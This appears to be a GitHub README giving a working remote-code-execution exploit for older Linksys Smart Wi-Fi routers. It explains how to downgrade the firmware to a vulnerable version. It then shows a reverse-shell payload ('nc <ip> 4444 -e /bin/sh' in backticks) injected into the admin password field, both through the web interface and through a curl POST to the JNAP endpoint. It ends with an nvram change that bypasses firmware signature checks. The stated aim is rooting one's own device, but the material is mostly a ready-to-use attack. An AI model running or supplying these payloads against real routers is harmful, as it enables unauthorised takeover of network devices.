
# Linksys-Router-RCE
A exploit for older Linksys Smart Wi-Fi routers that's able to get root shell access and unsigned firmware (like OpenWRT) with just the web admin login.

## IMPORTANT:
This exploit was discovered by IOActive and patched in 2017 (It's still possible to downgrade the firmware from the web interface though) but since they never released a PoC I used AI to look through my vulnerable firmware I extracted and it found the exploit. (Only the exploit was found with AI but this writing is not AI generated)

## Tested devices:
Linksys EA9400, Firmware 1.0.2.174688

## Downgrading the firmware:
If you have a vulnerable router model (You can check with the list [here](https://www.ioactive.com/linksys-smart-wi-fi-vulnerabilities/)) but you have a patched firmware (To check, look at the firmware release notes on the Linksys website for your model and if you have a firmware with IOActive security patches you must downgrade the firmware to do this exploit), go to the routers web interface (usually 192.168.1.1), go to the "Troubleshooting" menu, go to the "Diagnostics" section, and you should see a button saying "Restore previous firmware" which will downgrade your firmware when you click it.

### If you can't find it, try going into the CA web interface then try again.

# Doing the exploit:
### This was done on Linux so don't complain if it says "command not found" or something like that on Windows

## Web interface method (recommended):
### Make sure you have the following noted:

 - Your PCs local IP (for example: 192.168.1.119)
 - The routers admin password (for example: admin)
 - The router IP (for example: 192.168.1.1)

### Start a netcat listener, for example to use port 4444 it's the following:

    nc -lvnp 4444

### Run the exploit:

 1. Log into the web interface
 2. Go to the "Connectivity" menu
 3. Change the router password to

    admin\`nc 192.168.1.119 4444 -e /bin/sh\`
    
### (make sure to change 192.168.1.119 to your PCs local IP)
### If the netcat listener connects but shows no text output, that means it's working but it only outputs text when you run a command.


## Command line method (not recommended for beginners):

### Make sure you have the following noted:

 - Your PCs local IP (for example: 192.168.1.119)
 - The routers admin password (for example "admin")
 - The router IP (for example: 192.168.1.1)
 - The JNAP authorization token from the first section (for example: Basic YWRtaW46YWRtaW4=)

### Get the JNAP authorization token:

 

 1. List item
 2. Go in the routers web interface (for example: 192.168.1.1).
 3. Right click and open inspect element.
 4. Go to the "Network" section of inspect element.
 5. Log into the router.
 6. Find a request going to "/JNAP".
 7. Click it.
 8. In the "Headers" section for the request you want to find the X-JNAP-Authorization header (for example it could say: X-JNAP-Authorization: Basic YWRtaW46YWRtaW4=).
 9. If it doesn't have the token in that request look at other JNAP requests until you find it.
 10. Note the token so you don't forget it.

### Start a netcat listener, for example to use port 4444 it's the following:

    nc -lvnp 4444

### In a 2nd shell run the exploit (make sure to change the information to what you have):

    curl -X POST http://192.168.1.1/JNAP/ -H "Content-Type: application/json" -H "X-JNAP-Action: http://linksys.com/jnap/core/SetAdminPassword" -H "X-JNAP-Authorization: Basic YWRtaW46YWRtaW4=" -d '{"adminPassword": "admin`nc 192.168.1.119 4444 -e /bin/sh`"}' 
#### In this command it changes the admin password to a malicious one that runs `nc 192.168.1.119 4444 -e /bin/sh` using the example JNAP token 
###  If the netcat listener connects but shows no text output, that means it's working but it only outputs text when you run a command.

## Running unsigned firmware (for US model routers only)
### If your router requires firmware to be signed (like the US model Linksys EA9400/EA9500) but you don't want to use a serial connection you can run in your routers root shell the following:

    nvram set cert_region=EU
    nvram commit

### You will now be able to run unsigned firmware by flashing it in the web interface.
